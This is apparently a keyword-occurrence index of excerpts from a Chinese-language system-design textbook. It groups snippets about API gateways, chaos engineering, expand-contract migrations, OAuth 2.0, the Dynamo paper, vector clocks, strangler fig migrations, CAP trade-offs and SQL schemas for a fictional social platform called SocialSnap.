  c14_b07.md: ...CRDT 是一种精心设计的数据结构，你可以以任意顺序应用更新，总能得到相同答案。没有冲突需要解决。  例子：  **G-Counter（只增计数器）：** 每个节点维护自己本地计数器。G-Counter 的值是所有本地计数器之和。任意节点都可以无需协调递...
  c14_b07.md: ...到相同答案。没有冲突需要解决。  例子：  **G-Counter（只增计数器）：** 每个节点维护自己本地计数器。G-Counter 的值是所有本地计数器之和。任意节点都可以无需协调递增自己的本地计数器。合并两个 G-Counter 时，取每个本地计数...
  c14_b07.md: ...自己本地计数器。G-Counter 的值是所有本地计数器之和。任意节点都可以无需协调递增自己的本地计数器。合并两个 G-Counter 时，取每个本地计数器的最大值。这总能得到正确的总和。SocialSnap 帖子的点赞数可以是 G-Counter——任...
  c14_b07.md: ...G-Counter 时，取每个本地计数器的最大值。这总能得到正确的总和。SocialSnap 帖子的点赞数可以是 G-Counter——任何服务器都可以本地记录一次点赞递增，最终通过合并计算总数。  **OR-Set（Observed-Remove S...
  c14_b08.md: ...料更新（改简介）很少发生，可以无大碍地用最后写入获胜——不同地区同一用户同时编辑资料的概率可忽略。帖子点赞数可以用 G-Counter CRDT——计数不管怎样都能正确累积。支付记录需要单区域写和强一致——你绝不希望财务数据出现写冲突。...
  c14_b13.md: ...**Q3.** SocialSnap 想实现一个分布式点赞计数器，任何数据中心都能本地记录点赞，总数最终收敛。解释 G-Counter CRDT 在该场景如何工作，并描述收敛期间读者看到什么。  提示  每个数据中心维护自己本地计数器。总数怎么计算？...
  c14_b13.md: ...描述收敛期间读者看到什么。  提示  每个数据中心维护自己本地计数器。总数怎么计算？  **答案：** 帖子点赞的 G-Counter 实现：  每个帖子记录包含每个数据中心的点赞计数：`{"us-east": 1203, "eu-west": 847,...
  c14_b13.md: ...048）。他们看到略有不同的总数。两个数都“正确”，因为它们反映了本地数据中心迄今观察到的所有点赞。没有点赞丢失——G-Counter 保证计数单调递增，合并始终保留每次递增。一旦两个数据中心交换更新，所有读者对总数达成一致。  保证的性质：一旦点赞被记...

=== gateway (8 occurrences) ===
  c15_b12.md: ...*答案：** 基于编舞的“关注用户”Saga：  **触发：** “关注”按钮的 HTTP 处理器收到请求。在 API Gateway 数据库中插入 pending 的 `follow_request` 记录，并通过 Outbox 模式发布 `follo...
  c17_b06.md: ...一个日志文件。但到了第 13 章的微服务架构，单次用户请求加载 news feed 可能调用五个服务：  1. API Gateway——接收请求，通过 Auth Service 认证用户 2. Auth Service——验证 JWT token 3....
  c17_b06.md: ...求追踪的文本形式示例：       Trace ID: abc123       [0ms - 245ms]  API Gateway: handle GET /feed         [5ms - 20ms]   Auth Service: vali...
  c17_b12.md: ...太久）而不是基础设施指标（CPU、内存）。  **Q3.** 一次用户登录请求的分布式追踪显示以下 spans：API Gateway（10ms）、Auth Service（380ms）、Auth Service 下无子 span。Auth Servic...
  c20_b05.md: ...RL 写入 Redis  写路径上，限流至关重要：单个 IP 可产生大量创建请求，消耗存储并可能耗尽码空间。在 API gateway 层限流——每小时每 IP 100 次创建——防止滥用。...
  c21_b10.md: ...），以满足 DMs 不得降低核心体验的约束。  当前架构长什么样？SocialSnap v7 拥有：  * **API gateway + 负载均衡器（load balancer）** 处理所有入站流量 * **应用服务器**（无状态的，stateles...
  c22_b06.md: ...feed 中的生命周期。   #### 帖子创建流程  1. **用户 U 创建帖子 P：** U 的客户端向 API gateway 发送 `POST /posts`。Post Service 把 P 写入帖子数据库：`INSERT INTO post...
  c28_b12.md: ...idecar 代理） | N/A | 极高（熔断、重试） | 极高——Istio/Linkerd 运营负担 **API gateway** (Ch 13, 9) | 小开销 | N/A | 中——未集群则 SPOF | 中 **CQRS** (Ch 8,...

=== chaos (8 occurrences) ===
  c16_b10.md: ...neering）**：故意向生产系统引入故障，以验证系统正确响应以及团队的事故响应流程有效。  Netflix 用 **Chaos Monkey** 推广了混沌工程——一个随机终止生产实例的服务。目标：如果服务器随时可能挂，团队必须确保系统优雅处理服...
  c16_b17.md: ...aging 环境无法揭示的边界情况，意味着故障转移机制的第一次“真实”测试就是失控生产失败。  Netflix 的发现：Chaos Monkey 刚部署时，经常揭示团队原以为已正确处理的失败。健康检查不工作。理论上可故障转移实际不可行。依赖项未被正确...
  c18_b04.md: ...#### Chaos Monkey 的故事  Netflix 用名为 Chaos Monkey 的工具推广了混沌工程。Netflix 运行在...
  c18_b04.md: ...#### Chaos Monkey 的故事  Netflix 用名为 Chaos Monkey 的工具推广了混沌工程。Netflix 运行在 AWS 上，他们观察到 EC2 实例有时会意外失败。与其构...
  c18_b04.md: ...，你将在最糟糕的情况下修复问题——生产环境、意外、用户受影响。如果你在受控混沌实验中发现，你可以从容、仔细盯着修复。  Chaos Monkey 后来扩展为一个套件，称为 Simian Army，包含：  * **Chaos Gorilla：** 摧...
  c18_b04.md: ...以从容、仔细盯着修复。  Chaos Monkey 后来扩展为一个套件，称为 Simian Army，包含：  * **Chaos Gorilla：** 摧毁整个可用区（availability zone，可用性） * **Latency Monke...
  c18_b14.md: ...是“故意制造 outage”。做好时，它是“故意引入特定、有界、被监控的失败，以验证系统按设计处理它。”Netflix Chaos Monkey 并非无观察地随机 kill 生产服务器——它是在工作时间、工程师盯着、自动监控和回滚流程就绪时 kill...
  c28_b13.md: ...A** (Ch 19) | N/A（测量，非设计模式） | N/A | 强制明确可用性目标 | 中——监控基础设施 **Chaos engineering** (Ch 19) | N/A（测试实践） | N/A | 提升对可用性的信心 | 高——需要...

=== monkey (8 occurrences) ===
  c16_b10.md: ...g）**：故意向生产系统引入故障，以验证系统正确响应以及团队的事故响应流程有效。  Netflix 用 **Chaos Monkey** 推广了混沌工程——一个随机终止生产实例的服务。目标：如果服务器随时可能挂，团队必须确保系统优雅处理服务器死亡。通过...
  c16_b17.md: ...环境无法揭示的边界情况，意味着故障转移机制的第一次“真实”测试就是失控生产失败。  Netflix 的发现：Chaos Monkey 刚部署时，经常揭示团队原以为已正确处理的失败。健康检查不工作。理论上可故障转移实际不可行。依赖项未被正确熔断。每次发现...
  c18_b04.md: ...#### Chaos Monkey 的故事  Netflix 用名为 Chaos Monkey 的工具推广了混沌工程。Netflix 运行在 AWS 上，...
  c18_b04.md: ...#### Chaos Monkey 的故事  Netflix 用名为 Chaos Monkey 的工具推广了混沌工程。Netflix 运行在 AWS 上，他们观察到 EC2 实例有时会意外失败。与其构建旨在防止实例...
  c18_b04.md: ...糕的情况下修复问题——生产环境、意外、用户受影响。如果你在受控混沌实验中发现，你可以从容、仔细盯着修复。  Chaos Monkey 后来扩展为一个套件，称为 Simian Army，包含：  * **Chaos Gorilla：** 摧毁整个可用区（...
  c18_b04.md: ...Chaos Gorilla：** 摧毁整个可用区（availability zone，可用性） * **Latency Monkey：** 在服务调用中引入人为延迟 * **Conformity Monkey：** 检查实例是否符合配置标准，终止不合规...
  c18_b04.md: ...zone，可用性） * **Latency Monkey：** 在服务调用中引入人为延迟 * **Conformity Monkey：** 检查实例是否符合配置标准，终止不合规实例   #### 混沌工程测试什么  混沌实验测试“Redis 宕机时熔断...
  c18_b14.md: ...outage”。做好时，它是“故意引入特定、有界、被监控的失败，以验证系统按设计处理它。”Netflix Chaos Monkey 并非无观察地随机 kill 生产服务器——它是在工作时间、工程师盯着、自动监控和回滚流程就绪时 kill。目标是让潜在...

=== expand (8 occurrences) ===
  c18_b08.md: ...旧列名的查询都会失败，直到代码也更新。  高可用（high-availability，可用性）系统最安全的迁移模式是**expand-contract**，也称**parallel change**：  **阶段 1（Expand）：** 在旁边添加新...
  c18_b10.md: ...雀更适合想观察真实用户行为和指标再下决定的变更。  **Q3.** 为什么数据库 schema 迁移是部署中最难的部分，expand-contract 模式为什么比直接 schema 变更更安全？  **答案：** 直接 schema 变更危险，因为数...
  c18_b10.md: ...，每个查询都会失败——可能瞬间影响所有用户。回滚需要反向重跑迁移，如果数据已按新 schema 写入，这可能不可能。  expand-contract 模式更安全，因为它同时保持旧和新 schema 状态有效，允许旧代码和新代码在迁移窗口期间共存。应用...
  c18_b12.md: ...提示  思考操作顺序：数据库必须先满足什么，应用代码才能运行？应用必须先满足什么，用户才能看到功能？对数据库迁移使用 expand-contract 模式，并考虑三个阶段是否需要协调。  **答案：**  **阶段 1——数据库 Expand（第 1...
  c18_b12.md: ...移使用 expand-contract 模式，并考虑三个阶段是否需要协调。  **答案：**  **阶段 1——数据库 Expand（第 1 周）：**  * 部署迁移：添加 `reactions` 表（id, post_id, user_id, re...
  c18_b12.md: ...提示  思考操作顺序：数据库必须先满足什么，应用代码才能运行？应用必须先满足什么，用户才能看到功能？对数据库迁移使用 expand-contract 模式，并考虑三个阶段是否需要协调。  **答案：**  **阶段 1——数据库 Expand（第 1...
  c18_b12.md: ...移使用 expand-contract 模式，并考虑三个阶段是否需要协调。  **答案：**  **阶段 1——数据库 Expand（第 1 周）：**  * 部署迁移：添加 `reactions` 表（id, post_id, user_id, re...
  c18_b15.md: ...能开关——是风险管理工具。蓝绿提供瞬时回滚。金丝雀把影响范围限制在少部分用户。功能开关把部署与发布解耦。数据库迁移需要 expand-contract 模式，以在部署窗口期间保持向后兼容。  SocialSnap 的第一次金丝雀部署——新 feed 排...

=== oauth (8 occurrences) ===
  c19_b02.md: ...限访问 * 同一系统内不同服务需要不同数据库访问级别  把认证和授权视为恰好一起使用的独立系统。   ### 19.2 OAuth 2.0 与基于 token 的认证  SocialSnap 的第三方开发者 API 需要一种机制，让用户向应用授予有限...
  c19_b02.md: ...方应用共享密码是灾难性安全实践：如果应用被入侵，攻击者现在就拥有用户密码，可能也适用于用户邮箱、银行或其他账户。  **OAuth 2.0** 是委托授权的行业标准协议——向第三方授予账户有限访问而不泄露凭证。...
  c19_b03.md: ...#### OAuth 2.0 流程（概念）  当用户把第三方应用（“PostScheduler”）连接到 SocialSnap 时，发生如下...
  c19_b14.md: ...思考完整生命周期：应用如何注册？用户如何授予应用访问？应用如何发起认证请求？用户如何撤销访问？什么存在哪里？概念上使用 OAuth 2.0（OAuth 2.0）流程。  **答案：**  **应用注册：** 开发者向 SocialSnap 注册应用（...
  c19_b14.md: ...三方应用中的“Connect to SocialSnap”。 2. 应用把用户重定向到 `socialsnap.com/oauth/authorize?client_id=...&scope=read:posts,read:profile&redir...
  c19_b14.md: ...client_id`、`client_secret` 和 `AUTH_CODE` 发到 `socialsnap.com/oauth/token`（server-to-server，永远不在用户浏览器中）。 6. SocialSnap 返回 `acce...
  c19_b14.md: ...n。现有 access token 在最长 1 小时内（或下次轮换前）仍有效——考虑到短生命周期，这是可接受的。  **OAuth token 数据库 schema：**  * `oauth_apps`：client_id, client_secre...
  c19_b17.md: ...础概念——认证、授权、最小权限原则——是必须早期做出的架构决策。  认证和授权是独立关注点。认证建立身份；授权决定权限。OAuth 2.0 支持第三方访问的委托授权。JWT 支持密码学可验证 claims 的无状态认证。  加密保护数据在两种场景：传...

=== ride (8 occurrences) ===
  c25_b04.md: ...中一个接受，体验差。串行更慢但更干净。真实系统用混合：同时向 top 3 发出邀请，接受最快响应，取消其他。  待处理 ride request 的状态机由匹配服务管理。每个状态转换（REQUESTED → OFFERED_TO_DRIVER、OF...
  c25_b04.md: ...布式事务（distributed transaction）**：单个司机被原子地从“可用”池移动到“已分配”状态，同时 ride request 被原子地从“待处理”移动到“已接受”。  若此操作使用最终一致性，不同数据中心的两个调度服务器可能同时...
  c25_b04.md: ...xactly-once 语义。  回忆第 4 章：强一致性以可用性为代价。网络分区期间，强一致的匹配服务可能无法处理新 ride request。真实系统接受这一点：短暂显示“无可用车辆”比司机双重预订更好。  * * *...
  c25_b05.md: ...但可放入内存，并按地理区域分片。每个区域的图维护在专用路由服务器上。   #### 动态加价作为控制系统  某地理区域 ride request 超过可用司机时，动态加价激活：价格上涨以同时减少需求（部分乘客因高价放弃）并增加供给（更高收入使更多司...
  c25_b05.md: ...使更多司机愿意上线）。  动态加价实现为一个控制循环：  1. **监控：** 持续观察每个 geohash 单元格的 ride request 与可用司机比率，按滚动 5 分钟窗口聚合 2. **触发：** 若 request-to-driver...
  c25_b05.md: ...数与供需失衡成正比（2:1 时 1.5×，4:1 时 2×，等等） 4. **传播：** 更新定价服务；该单元格所有新 ride request 收到加价；进行中行程不受影响 5. **重新评估：** 每 5 分钟重新计算比率并调整倍数  这是 *...
  c25_b05.md: ...）**：输出（价格倍数）与误差（供需缺口）成正比。更复杂的实现加入积分和微分项——价格变化更平滑，系统能预测趋势——即 ride 定价的 PID 控制器。  * * *...
  c25_b11.md: ...价倍数在请求用车时锁定，而非行程开始或结束时。这创造了一个一致、用户可理解的契约（“你请求时已同意 2×”）。数据模型：ride request 创建时，系统把请求时的动态加价倍数直接记录在 `trips` 表中：`trips.surge_mult...

=== dynamo (8 occurrences) ===
  c26_b03.md: ...quorum 行为：若无法达到 W 个节点，写失败。这保证一致性但牺牲可用性——任何节点故障都会导致对应键的写失败。  Dynamo 方法（来自 Amazon 2007 年著名论文，本章设计基于它）：**sloppy quorum** 加 **hint...
  c26_b07.md: ...### 26.7 Dynamo 论文——关键创新  Amazon 2007 年发表 Dynamo 论文，描述了支撑 Amazon 购物车等服务的内部键...
  c26_b07.md: ...### 26.7 Dynamo 论文——关键创新  Amazon 2007 年发表 Dynamo 论文，描述了支撑 Amazon 购物车等服务的内部键值存储。该论文引入或普及了本章大部分概念。其关键创新：  1. *...
  c26_b07.md: ...集群成员问题 5. **Vector clock 冲突解决：** 处理两个客户端同时写同一键且写入到达不同副本的情况  Dynamo 论文是分布式系统设计分水岭：它证明高度可用、无主、最终一致的键值存储在生产规模可行，并给了行业一套具体机制（不只是原则...
  c26_b07.md: ...是原则）来实现它。  现代系统包括 Apache Cassandra、Riak 和 DynamoDB（托管云服务）都是 Dynamo 设计的直系后裔。当你在 SocialSnap 缓存中使用 Redis 时，你使用的是一个更简单的内存变体。当 Soci...
  c26_b07.md: ...用 Redis 时，你使用的是一个更简单的内存变体。当 SocialSnap 最终超出 Redis 并需要持久化、具备 Dynamo 风格保证的分布式存储时，本章概念就是升级的动力。  * * *   ### 26.8 练习...
  c26_b12.md: ...#### 深入思考  **Q1.** Dynamo 论文写于 2007 年，描述 Amazon 购物车的系统。购物车要求加入购物车的商品永不丢失——即使不同设备上的并发用...
  c26_b12.md: ...实际上是什么样？  **讨论：** 同一键在不同副本上的并发写会产生冲突：两个节点现在对同一键有不同值，都认为自己最新。Dynamo 论文引入 **vector clocks** 跟踪每次写的因果历史。Vector clock 是每键的（节点，版本）对...

=== vector (8 occurrences) ===
  c26_b07.md: ...** 高效解决副本分歧检测问题 4. **基于 gossip 的成员管理：** 无中央协调器解决集群成员问题 5. **Vector clock 冲突解决：** 处理两个客户端同时写同一键且写入到达不同副本的情况  Dynamo 论文是分布式系统设计分...
  c26_b12.md: ...：** 同一键在不同副本上的并发写会产生冲突：两个节点现在对同一键有不同值，都认为自己最新。Dynamo 论文引入 **vector clocks** 跟踪每次写的因果历史。Vector clock 是每键的（节点，版本）对列表，记录哪些节点见过该键的...
  c26_b12.md: ...现在对同一键有不同值，都认为自己最新。Dynamo 论文引入 **vector clocks** 跟踪每次写的因果历史。Vector clock 是每键的（节点，版本）对列表，记录哪些节点见过该键的哪个版本。当两次写冲突（彼此无因果后继）时，系统通过比...
  c26_b12.md: ...lock 是每键的（节点，版本）对列表，记录哪些节点见过该键的哪个版本。当两次写冲突（彼此无因果后继）时，系统通过比较 vector clocks 检测到冲突，并把两个值视为并发。对购物车：如果用户用手机加商品 A、用笔记本同时加商品 B，两次写都到达...
  c26_b12.md: ...：** 同一键在不同副本上的并发写会产生冲突：两个节点现在对同一键有不同值，都认为自己最新。Dynamo 论文引入 **vector clocks** 跟踪每次写的因果历史。Vector clock 是每键的（节点，版本）对列表，记录哪些节点见过该键的...
  c26_b12.md: ...现在对同一键有不同值，都认为自己最新。Dynamo 论文引入 **vector clocks** 跟踪每次写的因果历史。Vector clock 是每键的（节点，版本）对列表，记录哪些节点见过该键的哪个版本。当两次写冲突（彼此无因果后继）时，系统通过比...
  c26_b12.md: ...lock 是每键的（节点，版本）对列表，记录哪些节点见过该键的哪个版本。当两次写冲突（彼此无因果后继）时，系统通过比较 vector clocks 检测到冲突，并把两个值视为并发。对购物车：如果用户用手机加商品 A、用笔记本同时加商品 B，两次写都到达...
  c28_b10.md: ...sistency** (Ch 4) | 中——因果元数据开销 | 因果——保证“看到自己的写” | 高 | 高——需要 vector clock 等    （术语译法：一致性（consistency）、可用性（availability）、最终一致性（e...

=== fig (8 occurrences) ===
  c27_b06.md: ...#### 绞杀榕（Strangler Fig）模式  当你需要替换一个大型系统组件——比如把单体迁移到微服务时——诱惑是 **大爆炸重写**：关闭旧系统，构建新系统...
  c27_b06.md: ...会复制被替代系统的 bug（因为团队正在重新学习旧系统隐式处理的所有边界情况）。  替代方案是 **strangler fig** 模式：让新系统与旧系统并存，逐步将流量从旧系统路由到新系统，每块验证后再继续。  隐喻：绞杀榕围绕寄主树生长，逐渐...
  c27_b08.md: ...希位置落在新节点位置与其前驱之间的用户需要移动。操作可增量完成，无需停机。  **Q2.** 解释 strangler fig 模式，并与大爆炸重写对比。为什么大爆炸重写往往失败？  **答案：** Strangler fig：新系统与旧系统逐步...
  c27_b08.md: ...strangler fig 模式，并与大爆炸重写对比。为什么大爆炸重写往往失败？  **答案：** Strangler fig：新系统与旧系统逐步并行构建，流量逐渐从旧系统重定向到新系统，一次一个功能或服务。旧系统继续运行直到新系统处理 100%...
  c27_b08.md: ...产流量会揭示未预料的问题。(4) 团队低估范围（侯世达定律：任务总是比预期长，即使考虑侯世达定律）。Strangler fig 避免所有这些问题：新系统的每一块都在真实生产流量验证后才开始下一块。  **Q3.** 为什么康威定律认为 80 名工...
  c27_b10.md: ....** SocialSnap 团队决定因性能原因把通知服务从 Python 重写成 Go。设计一个 strangler fig 迁移计划，让他们能在生产流量中验证新的 Go 服务，同时保持即时回滚能力。  提示  思考如何同时把流量路由到两个服务...
  c27_b13.md: ...法（故意、无意、bit rot、架构）帮助团队优先偿还哪笔债务。架构债务最昂贵，应明确标记。  **Strangler fig 模式** 是大型迁移的安全方法：让新系统与旧系统并存，逐步转移流量，保持回滚能力。大爆炸重写几乎从不奏效。  **康威...
  c28_b15.md: ...| 极低（代码靠近用户） | 有限（无中央 DB 访问） | 极高 | 中——边缘部署流水线 **Strangler fig migration** (Ch 27) | 无延迟影响 | N/A | 极高（渐进；始终可逆） | 高——必须维护并行...

=== timescaledb (8 occurrences) ===
  c28_b21.md: ...数据、过去 3 个月的 1 分钟数据、过去 2 年的 1 小时数据）。原生支持时间窗口函数。PostgreSQL 需要 TimescaleDB 扩展或手动分区才能做到这些。3. 故障模式？InfluxDB v1 在多节点配置下有已知稳定性问题。Timescale...
  c28_b21.md: ...mescaleDB 扩展或手动分区才能做到这些。3. 故障模式？InfluxDB v1 在多节点配置下有已知稳定性问题。TimescaleDB 是 PostgreSQL 扩展——故障模式已被充分理解。为熟悉度偏好 TimescaleDB。4. 运营模型？Time...
  c28_b21.md: ...点配置下有已知稳定性问题。TimescaleDB 是 PostgreSQL 扩展——故障模式已被充分理解。为熟悉度偏好 TimescaleDB。4. 运营模型？TimescaleDB 运行在 PostgreSQL 上——SocialSnap 团队已经在运维 Po...
  c28_b21.md: ...leDB 是 PostgreSQL 扩展——故障模式已被充分理解。为熟悉度偏好 TimescaleDB。4. 运营模型？TimescaleDB 运行在 PostgreSQL 上——SocialSnap 团队已经在运维 PostgreSQL。所需新运营专长最少。I...
  c28_b21.md: ...上——SocialSnap 团队已经在运维 PostgreSQL。所需新运营专长最少。InfluxDB 需要新工具链。TimescaleDB 在运营连续性上胜出。5. 退出策略？TimescaleDB 数据存在 PostgreSQL 中；可通过标准 SQL 访...
  c28_b21.md: ...SQL。所需新运营专长最少。InfluxDB 需要新工具链。TimescaleDB 在运营连续性上胜出。5. 退出策略？TimescaleDB 数据存在 PostgreSQL 中；可通过标准 SQL 访问。迁移出去需要 ETL，但是可行的。退出策略良好。6. 还...
  c28_b21.md: ...tgreSQL 中；可通过标准 SQL 访问。迁移出去需要 ETL，但是可行的。退出策略良好。6. 还有谁在规模上运行？TimescaleDB 已被多家大公司大规模使用。公开的案例研究和 post-mortem 可获得。建议：采纳 TimescaleDB。它解决...
  c28_b21.md: ...上运行？TimescaleDB 已被多家大公司大规模使用。公开的案例研究和 post-mortem 可获得。建议：采纳 TimescaleDB。它解决真实问题，故障模式可接受，运营 familiar，退出策略清晰。  **Q3.** SocialSnap 经历了...

=== partition (7 occurrences) ===
  c02_b05.md: ...solation, Durability）把多个保证打包在一起——我们将在第 5 章仔细审视它们。   ### 2.5 Partition Tolerance——当网络说谎时  上面的指标——latency（延迟）、throughput（吞吐）、availa...
  c02_b05.md: ...障。网线会被意外切断（在大型数据中心里这比你想的更常见）。整个数据中心会失去网络连接。  **网络分区（network partition）** 是指网络故障把分布式系统分成无法互相通信的组。想象一座岛屿：服务器组 A 内部可以通信，服务器组 B 内部可以通...
  c02_b09.md: ...六个指标（latency、throughput、availability、consistency、durability、partition tolerance）按对该用例的重要性排序，并说明前三名的理由。  提示  想想牺牲每个指标会发生什么。哪种牺牲是灾难...
  c02_b09.md: ...：**Durability（持久性） > Consistency（一致性） > Availability（可用性） > Partition Tolerance（分区容错性） > Throughput（吞吐） > Latency（延迟）**  **为什么持久性...
  c02_b12.md: ...put（吞吐）、availability（可用性）、consistency（一致性）、durability（持久性）和 partition tolerance（分区容错性）**——是衡量每个架构决策的坐标轴。  没有系统能同时在所有六个轴上最优。添加缓存，你...
  c08_b04.md: ...扰。日志文件不会因为某个程序读取了就删除条目——条目按配置保留一段时间。  Kafka 的核心数据结构是**topic partition（主题分区）**——一个跨多台服务器分区以实现可扩展性的只追加日志。生产者把消息追加到日志末尾。消费者从日志读取，维护自...
  c21_b06.md: ...者，Apache Cassandra（第 6 章的列族存储）正是为该访问模式设计：Cassandra 的数据模型天然按 partition key（`conversation_id`）分区、按 sort key（`sent_at`）聚簇，提供 O(1) 的分...

=== north (7 occurrences) ===
  c04_b02.md: ...络分区期间，你必须选择：一致性还是可用性。**  让我们具体化。想象 SocialSnap 有两个数据库节点——叫它们 North 和 South——在彼此之间复制数据。用户的粉丝数存在两者之上。网络分区意味着 North 和 South 无法通信。...
  c04_b02.md: ...有两个数据库节点——叫它们 North 和 South——在彼此之间复制数据。用户的粉丝数存在两者之上。网络分区意味着 North 和 South 无法通信。  **选项 A：选择一致性（牺牲可用性）**  分区发生时，North 拒绝服务读写，因为...
  c04_b02.md: ...上。网络分区意味着 North 和 South 无法通信。  **选项 A：选择一致性（牺牲可用性）**  分区发生时，North 拒绝服务读写，因为它无法确认 South 拥有相同数据。恰好被路由到 North 的用户会收到错误：“服务不可用。”...
  c04_b02.md: ...致性（牺牲可用性）**  分区发生时，North 拒绝服务读写，因为它无法确认 South 拥有相同数据。恰好被路由到 North 的用户会收到错误：“服务不可用。” North 技术上仍在运行——它没有失败——但它选择不回答，以避免返回旧数据的风险...
  c04_b02.md: ...拒绝服务读写，因为它无法确认 South 拥有相同数据。恰好被路由到 North 的用户会收到错误：“服务不可用。” North 技术上仍在运行——它没有失败——但它选择不回答，以避免返回旧数据的风险。  South 也如此。两个节点都静默。  这...
  c04_b02.md: ...这是一致性：系统从不返回错误数据。但它在分区期间不可用。  **选项 B：选择可用性（牺牲一致性）**  分区发生时，North 和 South 都继续服务请求。用户在 North 上更新了自己的主页。另一个用户从 South 读取该主页。Sout...
  c04_b02.md: ...可用。  **选项 B：选择可用性（牺牲一致性）**  分区发生时，North 和 South 都继续服务请求。用户在 North 上更新了自己的主页。另一个用户从 South 读取该主页。South 还没有这次更新（分区阻止了它）。第二个用户看到旧...

=== south (7 occurrences) ===
  c04_b02.md: ...须选择：一致性还是可用性。**  让我们具体化。想象 SocialSnap 有两个数据库节点——叫它们 North 和 South——在彼此之间复制数据。用户的粉丝数存在两者之上。网络分区意味着 North 和 South 无法通信。  **选项 A...
  c04_b02.md: ...——叫它们 North 和 South——在彼此之间复制数据。用户的粉丝数存在两者之上。网络分区意味着 North 和 South 无法通信。  **选项 A：选择一致性（牺牲可用性）**  分区发生时，North 拒绝服务读写，因为它无法确认 So...
  c04_b02.md: ...th 无法通信。  **选项 A：选择一致性（牺牲可用性）**  分区发生时，North 拒绝服务读写，因为它无法确认 South 拥有相同数据。恰好被路由到 North 的用户会收到错误：“服务不可用。” North 技术上仍在运行——它没有失败—...
  c04_b02.md: ...户会收到错误：“服务不可用。” North 技术上仍在运行——它没有失败——但它选择不回答，以避免返回旧数据的风险。  South 也如此。两个节点都静默。  这是一致性：系统从不返回错误数据。但它在分区期间不可用。  **选项 B：选择可用性（牺牲...
  c04_b02.md: ...统从不返回错误数据。但它在分区期间不可用。  **选项 B：选择可用性（牺牲一致性）**  分区发生时，North 和 South 都继续服务请求。用户在 North 上更新了自己的主页。另一个用户从 South 读取该主页。South 还没有这次更...
  c04_b02.md: ...）**  分区发生时，North 和 South 都继续服务请求。用户在 North 上更新了自己的主页。另一个用户从 South 读取该主页。South 还没有这次更新（分区阻止了它）。第二个用户看到旧数据。  这是可用性：系统总是响应。但它在分区...
  c04_b02.md: ...orth 和 South 都继续服务请求。用户在 North 上更新了自己的主页。另一个用户从 South 读取该主页。South 还没有这次更新（分区阻止了它）。第二个用户看到旧数据。  这是可用性：系统总是响应。但它在分区期间可能返回旧数据或不一...

=== operational (7 occurrences) ===
  c04_b12.md: ...弃另一个——那会丢失数据。但要求线性一致性意味着任何网络抖动时文档都会变得无响应。真正的答案是一种专门的一致性模型：**Operational Transformation（OT，操作变换）** 或 **CRDTs（Conflict-free Replicate...
  c28_b10.md: ...Latency Impact | Consistency Impact | Availability Impact | Operational Complexity ---|---|---|---|--- **Caching** (Ch 7) | 大幅降低读延迟...
  c28_b11.md: ...Latency Impact | Consistency Impact | Availability Impact | Operational Complexity ---|---|---|---|--- **Relational DB (PostgreSQL)...
  c28_b12.md: ...Latency Impact | Consistency Impact | Availability Impact | Operational Complexity ---|---|---|---|--- **Horizontal scaling** (Ch 1...
  c28_b13.md: ...Latency Impact | Consistency Impact | Availability Impact | Operational Complexity ---|---|---|---|--- **Graceful degradation** (Ch...
  c28_b14.md: ...Latency Impact | Consistency Impact | Availability Impact | Operational Complexity ---|---|---|---|--- **URL shortening (redirect)*...
  c28_b15.md: ...Latency Impact | Consistency Impact | Availability Impact | Operational Complexity ---|---|---|---|--- **Microservice decomposition...

=== hash (7 occurrences) ===
  c20_b11.md: ...4:clicks (NOW-300) NOW`。返回该时间窗口内所有带时间戳的点击。  实时国家聚合：维护 Redis hash `url:abc1234:countries:5min`，用 `HINCRBY` 累加各国数量。每个国家码是 hash...
  c20_b11.md: ...hash `url:abc1234:countries:5min`，用 `HINCRBY` 累加各国数量。每个国家码是 hash 字段，值为计数。该 hash TTL 5 分钟；每 5 分钟重置。  **一致性模型：** 实时分析（5 分钟窗口）使...
  c20_b11.md: ...34:countries:5min`，用 `HINCRBY` 累加各国数量。每个国家码是 hash 字段，值为计数。该 hash TTL 5 分钟；每 5 分钟重置。  **一致性模型：** 实时分析（5 分钟窗口）使用最终一致性——事件发生后数秒...
  c23_b09.md: ...是所有文档的极小一部分。  **Q4.** 为什么爬虫的 seen-set 需要 Bloom filter 而不是标准 hash set？  **答案：** 标准 hash set 把每个 URL 存为完整字符串。100 亿（10 billion）...
  c23_b09.md: ...为什么爬虫的 seen-set 需要 Bloom filter 而不是标准 hash set？  **答案：** 标准 hash set 把每个 URL 存为完整字符串。100 亿（10 billion）URL 平均 100 字节，精确 seen-...
  c26_b01.md: ...决定如何分布数据。给定 N 个节点和数百万键，哪个节点负责哪些键？  朴素方法：`responsible_node = hash(key) mod N`。若哈希产生均匀分布，键大致均匀分布在 N 个节点上。  问题：添加或删除节点时，N 改变。N=...
  c26_b01.md: ...，键 "user:123" 哈希到节点 2（hash("user:123") mod 5 = 2）。添加节点后 N=6，hash("user:123") mod 6 可能是 4。几乎所有键的责任节点改变——需要全量数据迁移。向 5 节点集群添加一个...

=== cascade (7 occurrences) ===
  c05_b06.md: ...user_id     INTEGER REFERENCES users(id) ON DELETE CASCADE,         content     TEXT NOT NULL,         like_count  INT...
  c05_b06.md: ...follower_id INTEGER REFERENCES users(id) ON DELETE CASCADE,         followed_id INTEGER REFERENCES users(id) ON DELETE...
  c05_b06.md: ...followed_id INTEGER REFERENCES users(id) ON DELETE CASCADE,         created_at  TIMESTAMP DEFAULT NOW(),         PRIMA...
  c05_b06.md: ...user_id     INTEGER REFERENCES users(id) ON DELETE CASCADE,         post_id     INTEGER REFERENCES posts(id) ON DELETE...
  c05_b06.md: ...post_id     INTEGER REFERENCES posts(id) ON DELETE CASCADE,         created_at  TIMESTAMP DEFAULT NOW(),         PRIMA...
  c05_b10.md: ...post_id     INTEGER REFERENCES posts(id) ON DELETE CASCADE,         user_id     INTEGER REFERENCES users(id) ON DELETE...
  c05_b10.md: ...user_id     INTEGER REFERENCES users(id) ON DELETE CASCADE,         created_at  TIMESTAMP DEFAULT NOW(),         PRIMA...

=== consistent (7 occurrences) ===
  c06_b06.md: ...**BASE** 代表 **Basically Available, Soft state, Eventually consistent（基本可用、软状态、最终一致）。**  * **基本可用（Basically Available）：** 系统始终可用（...
  c06_b06.md: ...te）：** 即使没有新写入，系统状态也会随时间变化，因为副本在收敛到一致性。 * **最终一致（Eventually consistent）：** 如果没有新写入，系统最终会在所有副本上收敛到一致状态。  plain 语言：BASE 系统优先保证可用性而非正...
  c07_b06.md: ...单的。它是纯键值缓存：你存字符串，取字符串。没有数据类型、没有持久化、没有复制（基础版）。Memcached 集群使用 consistent hashing 跨节点分区数据（我们将在第 9 章研究）。如果一个节点失败，其数据丢失。  **最适合：** 简单、高...
